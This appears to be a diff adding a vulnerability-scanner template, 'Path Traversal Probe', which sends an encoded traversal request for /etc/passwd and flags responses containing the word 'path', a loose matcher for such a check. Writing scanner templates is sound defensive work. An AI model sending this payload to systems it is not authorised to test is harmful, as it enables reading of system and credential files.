@@ -1,0 +1,14 @@
+id: avvp-auth-dir-traversal-21
+info:
+  author: avvp
+  name: Path Traversal Probe
+  severity: high
+requests:
+- matchers:
+  - part: body
+    type: word
+    words:
+    - path
+  method: GET
+  path:
+  - /..%2f..%2fetc/passwd
